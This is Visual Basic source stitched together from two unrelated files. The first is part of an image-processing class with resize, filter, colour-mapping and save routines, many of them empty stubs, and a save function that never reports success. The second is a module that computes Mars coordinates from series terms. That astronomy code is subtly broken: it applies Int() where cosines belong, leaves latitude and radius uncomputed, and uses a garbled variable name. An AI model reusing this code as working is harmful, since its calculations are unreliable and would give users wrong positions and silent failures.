'The pipeline can also be set from the Ordinals of the options within each Enum (-1) uses a default
'Just calling this will give you a pipeline of PIC_BMP,PIC_COLOR,PIC_8BPP,PIC_OPTIMAL_CMAP,PIC_DITHER_NONE
Public Function SetPipelineOrdinal(Optional ByVal PicTypeOrdinal As Long = -1, _
                                   Optional ByVal ColorModeOrdinal As Long = -1, _
                                   Optional ByVal BitsPerPixelOrdinal As Long = -1, _
                                   Optional ByVal CMAPModeOrdinal As Long = -1, _
                                   Optional ByVal DitherModeOrdinal As Long = -1) As Boolean

  Call PicEnumFromOrdinals(PicTypeOrdinal, ColorModeOrdinal, BitsPerPixelOrdinal, CMAPModeOrdinal, DitherModeOrdinal)
  SetPipelineOrdinal = QualifyPipeline(PicTypeOrdinal, ColorModeOrdinal, BitsPerPixelOrdinal, CMAPModeOrdinal, DitherModeOrdinal)

End Function

'========= ELEMENTERY IMAGE PROCESSING ===== New Options should be added Here =================================

'They should all follow the convention that rc=False indicates failure, True=success

Public Function FlipVert() As Boolean

  FlipVert = FlipImageVert(zPicState, zWidth, zHeight, zIntBPP, zPixBits())   'deals with all MS formats

End Function

Public Function FlipHorz() As Boolean

  FlipHorz = FlipImageHorz(zWidth, zHeight, zIntBPP, zPixBits())              'deals with all MS formats

End Function

Public Function RotateL() As Boolean

  RotateL = RotateImageLeft(zPicState, zWidth, zHeight, zIntBPP, zPixBits())  '24 and 32BPP

End Function

Public Function RotateR() As Boolean

  RotateR = RotateImageRight(zPicState, zWidth, zHeight, zIntBPP, zPixBits()) '24 and 32BPP

End Function

Public Function Rotate180() As Boolean

  Rotate180 = RotateImage180(zPicState, zWidth, zHeight, zIntBPP, zPixBits()) 'all Formats

End Function

'Clip about centre
Public Function Clip(ByVal NewWidth As Long, ByVal NewHeight As Long) As Boolean

  Dim LeftClip As Long, TopClip As Long
  
  LeftClip = (zWidth - NewWidth) \ 2
  TopClip = (zHeight - NewHeight) \ 2
  Clip = Trim(LeftClip, TopClip, zWidth - (NewWidth + LeftClip), zHeight - (NewHeight + TopClip))

End Function

'NOTE::: This cannot be called through DoOperations as it Returns a new Image
Public Function Extract(ByVal atX As Long, ByVal atY As Long, _
                        ByVal Width As Long, ByVal Height As Long) As cRVTVBIMG
                        
  Set Extract = ExtractImage(zWidth, zHeight, zIntBPP, zPixBits(), atX, atY, Width, Height)

End Function

'Trim strips off left,top,right and bottom
Public Function Trim(ByVal LeftClip As Long, ByVal TopClip As Long, _
                     ByVal RightClip As Long, ByVal BottomClip As Long) As Boolean
  
  Trim = TrimImage(zWidth, zHeight, zIntBPP, zPixBits(), LeftClip, TopClip, RightClip, BottomClip)

End Function

'Frame
Public Function Frame(ByVal LeftRight As Long, TopBottom As Long, FrameRGBColor As Long) As Boolean
  
  Frame = FrameImage(zWidth, zHeight, zIntBPP, zPixBits(), LeftRight, TopBottom, FrameRGBColor)

End Function

'Integer Rescale
Public Function Resize(ByVal NewWidth As Long, ByVal NewHeight As Long) As Boolean

  Resize = ResizeImage(zWidth, zHeight, zIntBPP, zPixBits(), NewWidth, NewHeight)

End Function

'Integer Rescale
Public Function Zoom(ByVal XZoom As Single, Optional ByVal YZoom As Single = 0) As Boolean

  If YZoom = 0 Then YZoom = XZoom
  Zoom = ResizeImage(zWidth, zHeight, zIntBPP, zPixBits(), zWidth * XZoom, zHeight * YZoom)

End Function

Public Function BilinearResize(ByVal NewWidth As Long, ByVal NewHeight As Long) As Boolean

  BilinearResize = BilinearResizeImage(zWidth, zHeight, zIntBPP, zPixBits(), NewWidth, NewHeight)

End Function

Public Function BilinearZoom(ByVal XZoom As Single, Optional ByVal YZoom As Single = 0) As Boolean

  If YZoom = 0 Then YZoom = XZoom
  BilinearZoom = BilinearResizeImage(zWidth, zHeight, zIntBPP, zPixBits(), zWidth * XZoom, zHeight * YZoom)

End Function

Public Function Sharpen(Optional ByVal Factor As Long = 1) As Boolean

  Sharpen = SharpenImage(zWidth, zHeight, zIntBPP, zPixBits(), Factor)

End Function

Public Function Blur(Optional ByVal Factor As Long = 1) As Boolean

  Blur = BlurImage(zWidth, zHeight, zIntBPP, zPixBits(), Factor)

End Function

'Correct JPG Quantization Errors (somewhat)
Public Function DeJPEG(Optional ByVal Factor As Long = 1) As Boolean

  If Factor < 1 Or Factor > 4 Then Factor = 1
  DeJPEG = Blur(Factor)
  If DeJPEG Then DeJPEG = Sharpen(2 * Factor)

End Function

Public Function Emboss(Optional ByVal Factor As Long = 1) As Boolean

  Emboss = EmbossImage(zWidth, zHeight, zIntBPP, zPixBits(), Factor)

End Function

Public Function Edge(Optional ByVal Factor As Long = 1) As Boolean

  Edge = EdgeImage(zWidth, zHeight, zIntBPP, zPixBits(), Factor)

End Function

Public Function HardEdge(Optional ByVal Factor As Long = 1, Optional ByVal Threshold As Long = 240) As Boolean

  HardEdge = HardEdgeImage(zWidth, zHeight, zIntBPP, zPixBits(), Factor, Threshold)

End Function

'===================== TWO Image Procs ======================================================================

Public Function Splice(ByVal Image2 As cRVTVBIMG, Optional ByVal WhichEdge As PIC_JOIN_EDGES) As Boolean
  
  Splice = SpliceImage(zWidth, zHeight, zIntBPP, zPixBits(), Image2, WhichEdge)
  
End Function

Public Function AlphaBlend2(ByVal Image2 As cRVTVBIMG, ByVal RGBAlphaMask As Long, _
                            Optional ByVal AutoTile As Boolean = False) As Boolean
  
  AlphaBlend2 = Combine2Images(zWidth, zHeight, zIntBPP, zPixBits(), _
                               Image2, RGBAlphaMask, AutoTile, AlphaBlending:=True)
  
End Function

Public Function Combine2(ByVal Image2 As cRVTVBIMG, ByVal OpCode As PIC_COMBINATION_OPCODES, _
                         Optional ByVal AutoTile As Boolean = False) As Boolean
  
  Combine2 = Combine2Images(zWidth, zHeight, zIntBPP, zPixBits(), _
                            Image2, OpCode, AutoTile, AlphaBlending:=False)
  
End Function

'===================== THREE Image Procs ======================================================================

Public Function AlphaBlend3(ByVal Image2 As cRVTVBIMG, ByVal RGBAlphaImage As cRVTVBIMG) As Boolean
  
  AlphaBlend3 = AlphaBlend3Images(zWidth, zHeight, zIntBPP, zPixBits(), Image2, RGBAlphaImage)
  
End Function


'================================== COLOR OPERATIONS ======================================================

Public Function UnMapColor() As Boolean


End Function

'This one cannot be used in conjunction with Other Opcodes passing parameters or UnMapColor
Public Function MSMapColor(ByVal NewBPP As Long) As Boolean


End Function

Public Function InvertColor() As Boolean


End Function

Public Function MaskColor(ByVal RGBMask As Long) As Boolean

  MaskColor = CombineColor(PCC_AND, RGBMask)

End Function

'Replace TargetColor in region with ReplacementColor
Public Function ReplaceColor(ByVal TargetRGBColor As Long, ByVal SearchRadius As Long, ReplacementRGBColor As Long) As Boolean
  

End Function

Public Function SeparateColor(ByVal Which As PIC_SEPARATION_OPCODES) As Boolean

  SeparateColor = CombineColor(Which, &HFFFFFF)

End Function

Public Function EqualizeColor() As Boolean

  EqualizeColor = EqualizeImageColor(zWidth, zHeight, zIntBPP, zPixBits())

End Function

Public Function ThresholdColor(ByVal RGBMask As Long) As Boolean

  ThresholdColor = CombineColor(PCC_MIN, RGBMask)

End Function

'sRGB Gamma color correction, Abs(Gammas) must be >=1 <=2.4   - makes darker, + makes lighter
Public Function GammaCorrectColor(Optional ByVal RGamma As Single = 2.4, _
                                  Optional ByVal GGamma As Single = 2.4, _
                                  Optional ByVal BGamma As Single = 2.4) As Boolean
 
End Function

'Brightness color correction, Factor must be -1<=Factor<=1   - less Brightness, + more Brightness
Public Function BrightnessCorrectColor(Optional ByVal RFactor As Single = 0, _
                                     Optional ByVal GFactor As Single = 0, _
                                     Optional ByVal BFactor As Single = 0) As Boolean
 
End Function

'Each component of AlphaMask contributes, for flat alpgha pass a grey value ie r=g=b
Public Function AlphaBlendColor(ByVal RGBColor As Long, ByVal RGBAlphaMask As Long) As Boolean


End Function

'Each component of AlphaMask contributes, for flat alpgha pass a grey value ie r=g=b
Public Function InverseAlphaBlendColor(ByVal RGBColor As Long, ByVal RGBAlphaMask As Long) As Boolean


End Function

'values are automatically clamped to 0..255
Public Function CombineColor(ByVal OpCode As PIC_COMBINATION_OPCODES, ByVal RGBColor As Long) As Boolean


End Function

'===== COLORMAPPING IN PREPARATION FOR IMAGE SAVING ==========================================================

Public Function DoColorMapping() As Boolean
  
  DoColorMapping = XEQRemapping()
  
  If Not DoColorMapping Then
    MsgBox "RVTVBImg:: Color Mapping has Failed:" & vbCrLf _
         & "Either Pipeline is Invalid" & vbCrLf _
         & "or there is a shortage of Memory", vbCritical
  End If

End Function

'================================================================================================================
'Actually commit to disk (this could (probably will) go awry if called at the wrong time)
Public Function CommitToDisk(FilePath As String, PicType As IMG_PICTYPE) As Boolean
  
  etSave = zTimer.Elapsed
  
  If FSet(zPicState, IS_VALID_PIPELINE) Then
    On Error Resume Next
    If Len(FilePath) <> 0 Then Call Kill(FilePath)
    On Error GoTo 0
    
    Select Case PicType
     Case PIC_BMP:
       
     Case PIC_GIF, PIC_GIF_LACED:
       If FSet(zPicState, IS_CMAPPED) Then
       End If
       
     Case PIC_PNM:
    End Select
  End If
  
  etSave = zTimer.Elapsed - etSave
  
  If Not CommitToDisk Then
    MsgBox "RVTVBImg:: An Error has occurred while Saving Image" & vbCrLf _
          & "Is Filepath< " & FilePath & " > valid?", vbCritical
  End If

End Function

'To see all of the valid modes available call this sequentially from right to left
'If an option is given as -1 then the valid values for the combinations up to here is returned
'as a bitflagset. If returned as zero, the combination so far is actually invalid
Public Function ValidOptionFlags(Optional ByVal PicType As IMG_PICTYPE = -1, _
                                 Optional ByVal ColorMode As IMG_COLORMODES = -1, _
                                 Optional ByVal NColorMode As IMG_DEPTHMODES = -1, _
                                 Optional ByVal CMAPMode As IMG_CMAPMODES = -1, _
                                 Optional ByVal DitherMode As IMG_DITHERMODES = -1) As Long
End Function

'==============================================================================================================
'=== PRIVATE BELOW HERE =======================================================================================
'==============================================================================================================

'==============================================================================================================
'================================ PIPELINE VALIDATION AND EXECUTION ===========================================
'==============================================================================================================
Private Function QualifyPipeline(ByVal PicType As IMG_PICTYPE, _
                                 ByVal ColorMode As IMG_COLORMODES, _
                                 ByVal BitsPerPixel As IMG_DEPTHMODES, _
                                 ByVal CMAPMode As IMG_CMAPMODES, _
                                 ByVal DitherMode As IMG_DITHERMODES) As Boolean

  Call ClrF(zPicState, IS_VALID_PIPELINE)
  Call ValidatePipeline(PicType, ColorMode, BitsPerPixel, CMAPMode, DitherMode) 'fully extends to a valid pipeline
  
  zPicType = PicType
  zColorMode = ColorMode
  zCMAPMode = CMAPMode
  zDitherMode = DitherMode
 
  zReqBPP = BitsPerPixel          'required representation
    
'  If FSet(zCMAPMode, PIC_MSMAP) Then
'    zIntBPP = RestrictToMSModes(zCMAPMode, zReqBPP)  'we are limited to 1,4,8,16 24 or 32 planes of quantizing/mapping
'  Else
    If zReqBPP = PIC_1BPP Then Call SetF(zCMAPMode, PIC_GMAP)     'force greymap for BW
'    zIntBPP = PIC_24BPP                                           'internal representation (assumed)
'  End If

  'figure out the Nr of Colors
  If zReqBPP <= PIC_8BPP Then zNCMapColors = 2 ^ zReqBPP Else zNCMapColors = 0
  
  Call SetF(zPicState, IS_VALID_PIPELINE)
  QualifyPipeline = True
  
End Function

'===== COLORMAPPING IN PREPARATION FOR IMAGE SAVING ==========================================================

Private Function XEQRemapping() As Boolean
  
  If FClr(zPicState, IS_VALID_PIPELINE) Then GoTo ErrorFound       'must have a validated pipeline
   
  etRemap = zTimer.Elapsed
  
  If FSet(zCMAPMode, PIC_MSMAP) Then     'can be true for BMP image types for 1,4,8,15,32 BPP
    'There are cases where Operations may have unmapped the Image and it is now 24BPP
    'In this case we use the API to do MS style of remapping  'this is in mBitmap.bas
    
    etQuant = zTimer.Elapsed
    If zReqBPP = PIC_15BPP Then             'Special case where MS format is actually 1 bit wider than used
      If zIntBPP <> PIC_16BPP Then
        If Not MSMapColor(PIC_16BPP) Then GoTo ErrorFound
      End If
    ElseIf zReqBPP <> zIntBPP Then
      If Not MSMapColor(zReqBPP) Then GoTo ErrorFound
    End If
    etQuant = zTimer.Elapsed - etQuant
    
   Else                               '1-8,15,16,24,32 from a MS Bitmap
    etQuant = zTimer.Elapsed
      
    If FClr(zCMAPMode, PIC_UNMAPPED) Then   'Not going for 24 or 32 bit output
        
      If zIntBPP > PIC_8BPP Then      'we havent got a colormap so need to make one or use a Inted one
  
        '-------------------- COLORMAP DETERMINATION ---------------------------------------------------
        
        If FSet(zCMAPMode, PIC_VMAP) Then    'it will get picked up in AnalyseGamut
          '
        ElseIf FSet(zCMAPMode, PIC_IntED_CMAP) Then                     'we will use a Inted map
        
          If FSet(zCMAPMode, PIC_MODIFIED_CMAP) Then                    'we will modify a Inted color map
            zCMAPMode = PIC_IntED_CMAP Or zReqBPP
            zCMAPMode = PIC_OPTIMAL_CMAP Or zReqBPP
            
          ElseIf FSet(zCMAPMode, PIC_IntED_CMAP_USER) Then              'we will use the user's map
          Else
          End If
          
        Else   '------------------------------------- we are going to make one ourselves (hooray) -------
          
          'we are going to remap the BMP onto a best fit palette. We will use the 5 most significant bits
          'so we are effectively going to select from a gamut of 32x32x32 or 32768 shades
          'if you've got the memory you could make this 6 deep or 64^3=262144 shades, you'll also have to up HistCmap
          'NOTE:::: zIntBPP is the format given, zReqBPP=BitsPerPixel is what we want to achieve
          
          If zReqBPP > PIC_8BPP Then
            zNCMapColors = 256
          Else
            zNCMapColors = 2 ^ zReqBPP
          End If
          
          ReDim zCMap(0 To zNCMapColors - 1)
  
          'Initialize Remapping variables  - Using OctTree Quantization    'PixelWidth=significant bits BPP
          'also the colormap will be resized to the minimum power of 2 greater or equal to the number of colors used
          zReqBPP = CreateOctTreeCMap(zPicType, zWidth, zHeight, zPixBits(), zIntBPP, _
                                      zCMap(), zNCMapColors, OctTreeDepthBits:=6&)
  
          'Cleanup after ourselves to minimise storage
          Call DeleteOctTreeCMap
        End If
        etQuant = zTimer.Elapsed - etQuant
  
        '-------------------------- PIXEL REMAPPING  -----------------------------------------------------
        etRemap = zTimer.Elapsed
        If zReqBPP <> 0 Then
            
          ' Remap the new Palette onto the Image by dithering - PixBits is resized where necessary
          Select Case zDitherMode
           
           Case PIC_DITHER_SED1, PIC_DITHER_SED2, PIC_DITHER_SED3:
             Call SEDDitherMapColors(zWidth, zHeight, zPixBits(), zIntBPP, _
                                     zCMap(), zNCMapColors, zCMAPMode, zDitherMode)
           Case PIC_DITHER_NONE:
             Call SimpleMapColors(zWidth, zHeight, zPixBits(), zIntBPP, zCMap(), zNCMapColors, zCMAPMode)
    
           Case Else:
             Call MatDitherMapColors(zWidth, zHeight, zPixBits(), zIntBPP, _
                                     zCMap(), zNCMapColors, zCMAPMode, zDitherMode)
          End Select
        End If
        If zReqBPP = 0 Then GoTo ErrorFound
        
        'after colormapping has happened we are usually now an 8 bit pixelmap resized properly
        If FSet(zCMAPMode, PIC_VMAP) Then
          zIntBPP = PIC_16BPP
        Else
          zIntBPP = PIC_8BPP         ' we have made this into a newly colormapped 8BPP Bitmap
        End If
      End If
      
      'we now have a colormap in most cases, and the internal format is now PixelWidth 1,4 or 8 bits
      If NCMapColors <> 0 Then Call SetF(zPicState, IS_CMAPPED)
    End If
  End If

  '----------------------------- GREY REMAPPING  -------------------------------------------------------
  'we may have asked for a grey mapping - this is a cheap way to do it (but only if there is a colormap)

  If zColorMode = PIC_GREY And FClr(zCMAPMode, PIC_GMAP) Then     'but dont bother if we mapped to grey
    If FSet(zPicState, IS_CMAPPED) Then
      Call CMaptoGrey(zCMap())                                    'change the RGB palette to YUV greys
     Else
      Call MakePixelsGrey(zWidth, zHeight, zPixBits(), zIntBPP)   'Grey requires individual pixels to be changed
    End If
  End If

  '-------------------------- PALETTE SHRINKING (GIFS) -------------------------------------------------
  ' attempt to reduce the number of colors needed. This is done by counting their uses
  ' then shifting used ones to the front of the CMAP palette while at the same time Inting their
  ' references in the PixBits array

  If zPicType = PIC_GIF Or zPicType = PIC_GIF_LACED Then
    If FSet(zPicState, IS_CMAPPED) Then
      If FSet(zCMAPMode, PIC_SMALLEST_CMAP) Then
        If zIntBPP > PIC_1BPP Then
          zReqBPP = ShrinkCMap(zPixBits(), zIntBPP, zCMap(), zReqBPP)  'no point if only 2 colours
        End If
      End If
    End If
  End If

  XEQRemapping = True

ErrorFound:
  etRemap = zTimer.Elapsed - etRemap

End Function
'===========================================================================================================

':) Ulli's VB Code Formatter V2.16.6 (2003-Jun-03 21:35) 166 + 543 = 709 Lines


Attribute VB_Name = "FPStartShowFPS"
Attribute VB_Base = "0{46FE1393-1196-4E35-A438-E5FAD0FE955E}{DA153D87-E3C5-426B-A0B8-5FA0DCEC09C3}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

 Public Function LBR_For_Mars(At_JDE)
' LEVEL 0
' Heliocentric geometric coordinates
  Dim L As Double ' Longitude
  Dim B As Double ' Latitude
  Dim R As Double ' Radius vector (distance from sun)
  Dim Lite As Double ' Ephemeris time value
        
  Lite = (At_JDE - 2451545#) / 365250
     
  L = Mars_L01(Lite) + Mars_L02(Lite) + Mars_L03(Lite) _
    + Mars_L11(Lite) + Mars_L12(Lite) _
    + Mars_L21(Lite)
        
  
  L = L * 45 / Atn(1)
  If Abs(L) >= 360 Then L = L - 360 * Int(L / 360)
  If L < 0 Then L = L + 360
  
  B = B * 45 / Atn(1)


  LBR_For_Mars = L & "|" & B & "|" & R

  End Function

  Public Function Mars_L01(Lite)


 Dim OPOPOTAMIKUSE As Double
 OPOPOTAMIKUSE = 0#
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 6.20347711583 * Int(0 + 0 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.186563681 * Int(5.05037100303 + 3340.6124266998 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.01108216792 * Int(5.40099836958 + 6681.2248533996 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00091798394 * Int(5.75478745111 + 10021.8372800994 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00027744987 * Int(5.97049512942 + 3.523118349 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0001061023 * Int(2.93958524973 + 2281.2304965106 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00012315897 * Int(0.84956081238 + 2810.9214616052 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00008926772 * Int(4.15697845939 + 0.0172536522 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00008715688 * Int(6.11005159792 + 13362.4497067992 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00006797552 * Int(0.36462243626 + 398.1490034082 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00007774867 * Int(3.33968655074 + 5621.8429232104 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00003575079 * Int(1.66186540141 + 2544.3144198834 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00004161101 * Int(0.2281497533 + 2942.4634232916 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000307525 * Int(0.85696597082 + 191.4482661116 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00002628122 * Int(0.6480614357 + 3337.0893083508 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00002937543 * Int(6.07893711408 + 0.0673103028 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000238942 * Int(5.03896401349 + 796.2980068164 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00002579842 * Int(0.02996706197 + 3344.1355450488 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000152814 * Int(1.14979306228 + 6151.533888305 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00001798808 * Int(0.65634026844 + 529.6909650946 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00001264356 * Int(3.62275092231 + 5092.1519581158 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00001286232 * Int(3.06795924626 + 2146.1654164752 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00001546408 * Int(2.91579633392 + 1751.539531416 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00001024907 * Int(3.69334293555 + 8962.4553499102 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000891567 * Int(0.1829389909 + 16703.062133499 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000085876 * Int(2.40093704204 + 2914.0142358238 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000697 * Int(0.30680314664 + 19676.4502312364 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000065 * Int(3.23944472757 + 9588.1255422226 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000736 * Int(2.24443728739 + 11250.7993934216 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000692 * Int(1.76465916332 + 51.28033786241 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000645 * Int(0.07661067442 + 52.2603149128 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000685 * Int(2.72118140264 + 6643.0918177618 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000684 * Int(1.26157751115 + 142.1786270362 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000635 * Int(3.85231847116 + 6.0659156298 * Lite)
Mars_L01 = OPOPOTAMIKUSE * 1
End Function
' ************************

Public Function Mars_L02(Lite)

' L0 Segment #2 of 3

 Dim OPOPOTAMIKUSE As Double
 OPOPOTAMIKUSE = 0#
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000819 * Int(6.04967230806 + 19402.7969528166 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000664 * Int(3.6022393001 + 1903.4368125012 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000613 * Int(4.96450118774 + 8859.3625756916 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000016 * Int(5.66336382679 + 10927.2939767642 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000137 * Int(3.46860408347 + 5562.4690612968 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000192 * Int(5.27908098216 + 34363.365597556 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000137 * Int(5.87023088486 + 2945.9865416406 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000018 * Int(1.07686767816 + 15806.146839442 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000135 * Int(0.34109799474 + 7322.1024607818 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000169 * Int(2.2740858315 + 379.3734138742 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000172 * Int(3.83276777655 + 6621.850991486 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000134 * Int(0.8948661109 + 13286.1836355236 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000168 * Int(3.24434245132 + 11614.4332937322 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000135 * Int(6.03727673544 + 1214.8023296234 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000015 * Int(0.81912738038 + 3416.8784979754 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000136 * Int(5.06627117467 + 14421.8316369884 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000138 * Int(5.19336961955 + 13363.4300278674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000163 * Int(5.91124428824 + 16703.0793871512 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000181 * Int(3.31978654659 + 139.6981395228 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000162 * Int(4.05905033891 + 1795.258443721 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000132 * Int(0.409015061 + 1083.260367937 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000156 * Int(0.1230414464 + 1107.1388056848 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000158 * Int(6.25022915072 + 6666.997759398 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000131 * Int(3.95250083817 + 3.4558080462 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000147 * Int(4.94673462086 + 15010.8964639966 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000014 * Int(6.13853404667 + 12729.665967486 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000131 * Int(5.43398849473 + 25665.5174834092 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000135 * Int(5.06017183369 + 11876.469585734 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000128 * Int(2.8696933273 + 6549.6828917132 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000174 * Int(5.18169887171 + 28230.1872226914 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000179 * Int(3.25589354429 + 4922.5717749828 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000139 * Int(5.33624615245 + 23958.6317852334 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000127 * Int(5.78406495652 + 14577.1847261198 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000128 * Int(1.27276688747 + 8584.6616659008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000133 * Int(0.39052474466 + 12410.7313005486 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000134 * Int(1.09641189843 + 8962.438096258 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000125 * Int(3.20445201519 + 29.8820436102 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000136 * Int(3.62250122667 + 3511.285297319 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000162 * Int(5.36465149996 + 2472.6787626222 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000015 * Int(0.40179894287 + 1111.642245102 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000129 * Int(1.94909076932 + 19645.5255567906 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000172 * Int(5.21328160366 + 6747.712262314 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000126 * Int(4.39378462616 + 21548.9623692918 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000146 * Int(3.85987749053 + 13361.469385731 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000156 * Int(5.24740844581 + 6645.1969867222 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000137 * Int(4.94588047257 + 20995.3929664494 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000131 * Int(1.72431469184 + 11925.2740926006 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000136 * Int(2.04268940441 + 10654.6210194126 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000014 * Int(1.54439148652 + 8219.4652893776 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000127 * Int(6.16695075115 + 10016.314355792 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000155 * Int(5.47145482987 + 2.9689454166 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000132 * Int(6.25626202928 + 13227.3846267638 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000121 * Int(3.74135485334 + 10294.510237451 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000134 * Int(3.12718351732 + 8962.4726035624 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000122 * Int(0.77282907794 + 4936.7988689844 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000125 * Int(4.23213631052 + 15650.7937503106 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000157 * Int(1.79175545524 + 16489.763038061 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000155 * Int(4.15655698197 + 56.3831860762 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000134 * Int(1.53268827347 + 708.98980227659 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000136 * Int(4.01025697673 + 9797.4924843975 * Lite)
